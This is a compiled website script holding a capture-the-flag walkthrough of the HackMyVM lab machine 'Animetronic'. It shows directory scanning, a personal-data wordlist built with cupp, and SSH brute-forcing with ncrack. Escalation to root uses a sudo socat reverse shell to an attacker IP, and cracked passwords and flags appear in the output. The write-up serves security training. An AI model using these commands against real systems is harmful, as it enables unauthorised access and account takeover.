"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2354],{2840:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>o,toc:()=>h});var a=r(5893),t=r(1151);const s={},i="Animetronic",o={id:"HackMyVM/Machines/Animetronic/index",title:"Animetronic",description:"[Linux VM] [Tested on VirtualBox] created by || ziyos",source:"@site/docs/HackMyVM/Machines/Animetronic/index.md",sourceDirName:"HackMyVM/Machines/Animetronic",slug:"/HackMyVM/Machines/Animetronic/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Animetronic/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Animetronic/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Alzheimer",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Alzheimer/"},next:{title:"Azer",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Azer/"}},c={},h=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"web \u670d\u52a1\u63a2\u6d4b",id:"web-\u670d\u52a1\u63a2\u6d4b",level:2},{value:"\u5229\u7528\u793e\u5de5\u6570\u636e\u8fdb\u884c\u7206\u7834",id:"\u5229\u7528\u793e\u5de5\u6570\u636e\u8fdb\u884c\u7206\u7834",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"root pwned",id:"root-pwned",level:2}];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,t.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"animetronic",children:"Animetronic"}),"\n",(0,a.jsxs)(n.admonition,{type:"note",children:[(0,a.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || ziyos"}),(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2023-12-11"}),(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 30b3135e2016d3ae1b0d1c086a714ae9"}),(0,a.jsx)(n.p,{children:"\u2620 Root // 27"}),(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 26"}),(0,a.jsx)(n.p,{children:"\ud83d\udcddNotes //\nThe server administrator assigned you to hack this server .So don't disappoint him.This server is easy , just do not give up."})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,a.jsxs)(n.p,{children:["\u9776\u673a\u5730\u5740\uff1a",(0,a.jsx)(n.code,{children:"192.168.56.119"})]}),"\n",(0,a.jsx)(n.h2,{id:"web-\u670d\u52a1\u63a2\u6d4b",children:"web \u670d\u52a1\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"access /",src:r(339).Z+"",width:"1471",height:"881"})}),"\n",(0,a.jsx)(n.p,{children:"\u9875\u9762\u4e3a\u9759\u6001\u9875\u9762\uff0c\u65e0\u4ea4\u4e92\u70b9"}),"\n",(0,a.jsx)(n.p,{children:"\u76ee\u5f55\u626b\u63cf\uff1a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $feroxbuster -u http://192.168.56.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben "epi" Risher \ud83e\udd13                 ver: 2.10.1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.56.119\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.1\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        9l       28w      314c http://192.168.56.119/img => http://192.168.56.119/img/\n200      GET       52l      340w    24172c http://192.168.56.119/img/favicon.ico\n301      GET        9l       28w      314c http://192.168.56.119/css => http://192.168.56.119/css/\n200      GET     2761l    15370w  1300870c http://192.168.56.119/img/logo.png\n301      GET        9l       28w      313c http://192.168.56.119/js => http://192.168.56.119/js/\n200      GET        7l     1513w   144878c http://192.168.56.119/css/bootstrap.min.css\n200      GET       42l       81w      781c http://192.168.56.119/css/animetronic.css\n200      GET       52l      202w     2384c http://192.168.56.119/\n301      GET        9l       28w      321c http://192.168.56.119/staffpages => http://192.168.56.119/staffpages/\n200      GET      728l     3824w   287818c http://192.168.56.119/staffpages/new_employees\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u6761\u8def\u5f84\uff1a",(0,a.jsx)(n.code,{children:"http://192.168.56.119/staffpages/new_employees"}),"\uff0c\u8bbf\u95ee\u8fd4\u56de\u7684\u662f JPEG \u56fe\u50cf\u6570\u636e"]}),"\n",(0,a.jsx)(n.p,{children:"\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u8fdb\u884c\u9690\u5199\u5206\u6790\uff0c\u5728\u56fe\u7247\u7684\u8bc4\u8bba\u4e2d\u5f97\u5230\uff1a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89e3\u7801\uff0c\u5e76\u8fdb\u884c\u4e0a\u4e0b\u7ffb\u8f6c\u540e\uff0c\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"leahcim_rof_egassem\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u4fe1\u606f\uff0c\u5f97\u5230\u4ee5\u4e0b\u8def\u5f84\uff1a",(0,a.jsx)(n.code,{children:"/staffpages/message_for_michael"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Hi Michael\n\nSorry for this complicated way of sending messages between us.\nThis is because I assigned a powerful hacker to try to hack\nour server.\n\nBy the way, try changing your password because it is easy\nto discover, as it is a mixture of your personal information\ncontained in this file\n\npersonal_info.txt\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7ee7\u7eed\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"/staffpages/personal_info.txt"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:'name: Michael\n\nage: 27\n\nbirth date: 19/10/1996\n\nnumber of children: 3 "Ahmed - Yasser - Adam"\n\nHobbies: swimming\n'})}),"\n",(0,a.jsx)(n.h2,{id:"\u5229\u7528\u793e\u5de5\u6570\u636e\u8fdb\u884c\u7206\u7834",children:"\u5229\u7528\u793e\u5de5\u6570\u636e\u8fdb\u884c\u7206\u7834"}),"\n",(0,a.jsx)(n.p,{children:"\u6839\u636e\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u8fdb\u884c\u5b57\u5178\u751f\u6210"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $cupp -i\n ___________\n   cupp.py!                 # Common\n      \\                     # User\n       \\   ,__,             # Passwords\n        \\  (oo)____         # Profiler\n           (__)    )\\\n              ||--|| *      [Muris Kurgas | j0rgan@remote-exploit.org]\n                            [Mebus | https://github.com/Mebus/]\n\n\n[+] Insert the information about the victim to make a dictionary\n[+] If you don't know all the info, just hit enter when asked! ;)\n\n> First Name: Michael\n> Surname:\n> Nickname:\n> Birthdate (DDMMYYYY): 19101996\n\n\n> Partners) name:\n> Partners) nickname:\n> Partners) birthdate (DDMMYYYY):\n\n\n> Child's name: Ahmed\n> Child's nickname:\n> Child's birthdate (DDMMYYYY):\n\n\n> Pet's name:\n> Company name:\n\n\n> Do you want to add some key words about the victim? Y/[N]: y\n> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Ahmed,Yasser,Adam,swimming\n> Do you want to add special chars at the end of words? Y/[N]: y\n> Do you want to add some random numbers at the end of words? Y/[N]:y\n> Leet mode? (i.e. leet = 1337) Y/[N]: y\n\n[+] Now making a dictionary...\n[+] Sorting list and removing duplicates...\n[+] Saving dictionary to michael.txt, counting 12460 words.\n[+] Now load your pistolero with michael.txt and shoot! Good luck!\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u5c1d\u8bd5\u7206\u7834 Michael \u7684 SSH \u51ed\u636e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ncrack -T5 -v -u michael -P michael.txt ssh://192.168.56.119\n\nStarting Ncrack 0.7 (http://ncrack.org) at 2024-02-01 19:27 CST\n\nDiscovered credentials on ssh://192.168.56.119:22 'michael' 'leahcim1996'\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs michael@192.168.56.119\n[20:03:59] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\nPassword: ***********\n[20:04:02] 192.168.56.119:22: registered new host w/ db                                                                                                                                                                      manager.py:957\n(local) pwncat$ back\n(remote) michael@animetronic:/home/michael$ ls -lh\ntotal 0\n(remote) michael@animetronic:/home/michael$ la\n.bash_history  .bash_logout  .bashrc  .cache  .profile\n(remote) michael@animetronic:/home/michael$ ls -lah\ntotal 28K\ndrwxr-x--- 3 michael michael 4.0K Nov 27 21:03 .\ndrwxr-xr-x 4 root    root    4.0K Nov 27 18:10 ..\n-rw------- 1 michael michael    5 Nov 27 21:03 .bash_history\n-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 michael michael 3.7K Jan  6  2022 .bashrc\ndrwx------ 2 michael michael 4.0K Nov 27 18:50 .cache\n-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile\n(remote) michael@animetronic:/home/michael$ cd ../\n(remote) michael@animetronic:/home$ ls -lah\ntotal 16K\ndrwxr-xr-x  4 root    root    4.0K Nov 27 18:10 .\ndrwxr-xr-x 19 root    root    4.0K Nov 27 09:54 ..\ndrwxrwxr-x  6 henry   henry   4.0K Nov 27 20:59 henry\ndrwxr-x---  3 michael michael 4.0K Nov 27 21:03 michael\n(remote) michael@animetronic:/home$ cd henry/\n(remote) michael@animetronic:/home/henry$ ls -lah\ntotal 56K\ndrwxrwxr-x   6 henry henry 4.0K Nov 27 20:59 .\ndrwxr-xr-x   4 root  root  4.0K Nov 27 18:10 ..\n-rwxrwxr-x   1 henry henry   30 Jan  5 10:08 .bash_history\n-rwxrwxr-x   1 henry henry  220 Jan  6  2022 .bash_logout\n-rwxrwxr-x   1 henry henry 3.7K Jan  6  2022 .bashrc\ndrwxrwxr-x   2 henry henry 4.0K Nov 27 10:08 .cache\ndrwxrwxr-x   3 henry henry 4.0K Nov 27 10:42 .local\ndrwxrwxr-x 402 henry henry  12K Nov 27 18:23 .new_folder\n-rwxrwxr-x   1 henry henry  807 Jan  6  2022 .profile\ndrwxrwxr-x   2 henry henry 4.0K Nov 27 10:04 .ssh\n-rwxrwxr-x   1 henry henry    0 Nov 27 18:26 .sudo_as_admin_successful\n-rwxrwxr-x   1 henry henry  119 Nov 27 18:18 Note.txt\n-rwxrwxr-x   1 henry henry   33 Nov 27 18:20 user.txt\n(remote) michael@animetronic:/home/henry$ cat user.txt\n0833990328464efff1de6cd93067cfb7\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/henry/Note.txt"',children:"if you need my account to do anything on the server,\nyou will find my password in file named\n\naGVucnlwYXNzd29yZC50eHQK\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u89e3\u7801\u540e\u7684\u5230\uff1a",(0,a.jsx)(n.code,{children:"henrypassword.txt"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) michael@animetronic:/home/henry$ find / -type f -name henrypassword.txt 2>/dev/null\n/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt"',children:"IHateWilliam\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u5207\u6362\u5230 henry \u8d26\u6237"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(local) pwncat$ connect henry@192.168.56.119\nPassword: ************\n[20:10:19] 192.168.56.119:22: loaded known host from db                                                                                                                                                                      manager.py:957\n(local) pwncat$ sessions\n                                    Active Sessions\n     \u2577       \u2577                                  \u2577          \u2577      \u2577\n  ID \u2502 User  \u2502 Host ID                          \u2502 Platform \u2502 Type \u2502 Address\n \u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n  *1 \u2502 henry \u2502 fa000a0e16495f8dd261626f16b2971a \u2502 linux    \u2502 Ssh  \u2502 192.168.56.119:22\n     \u2575       \u2575                                  \u2575          \u2575      \u2575\n(local) pwncat$ back\n(remote) henry@animetronic:/home/henry$ ls -lah\ntotal 56K\ndrwxrwxr-x   6 henry henry 4.0K Nov 27 20:59 .\ndrwxr-xr-x   4 root  root  4.0K Nov 27 18:10 ..\n-rwxrwxr-x   1 henry henry   30 Jan  5 10:08 .bash_history\n-rwxrwxr-x   1 henry henry  220 Jan  6  2022 .bash_logout\n-rwxrwxr-x   1 henry henry 3.7K Jan  6  2022 .bashrc\ndrwxrwxr-x   2 henry henry 4.0K Nov 27 10:08 .cache\ndrwxrwxr-x   3 henry henry 4.0K Nov 27 10:42 .local\ndrwxrwxr-x 402 henry henry  12K Nov 27 18:23 .new_folder\n-rwxrwxr-x   1 henry henry  807 Jan  6  2022 .profile\ndrwxrwxr-x   2 henry henry 4.0K Nov 27 10:04 .ssh\n-rwxrwxr-x   1 henry henry    0 Nov 27 18:26 .sudo_as_admin_successful\n-rwxrwxr-x   1 henry henry  119 Nov 27 18:18 Note.txt\n-rwxrwxr-x   1 henry henry   33 Nov 27 18:20 user.txt\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for henry on animetronic:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser henry may run the following commands on animetronic:\n    (root) NOPASSWD: /usr/bin/socat\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u501f\u52a9 sudo+socat \u53cd\u5f39 shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"sudo /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.102:9999\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(local) pwncat$ connect -lp 9999\n[20:14:04] received connection from 192.168.56.119:51080                                                                                                                                                                         bind.py:84\n[20:14:05] 192.168.56.119:51080: registered new host w/ db                                                                                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) root@animetronic:/home/henry# whoami\nroot\n"})}),"\n",(0,a.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) root@animetronic:/root# cat root.txt \n153a1b940365f46ebed28d74f142530f280a2c0a\n"})})]})}function d(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},339:(e,n,r)=>{r.d(n,{Z:()=>a});const a=r.p+"assets/images/image_20240243-174340-6de204e9c6325932b2ad5995999a8229.png"},1151:(e,n,r)=>{r.d(n,{Z:()=>o,a:()=>i});var a=r(7294);const t={},s=a.createContext(t);function i(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);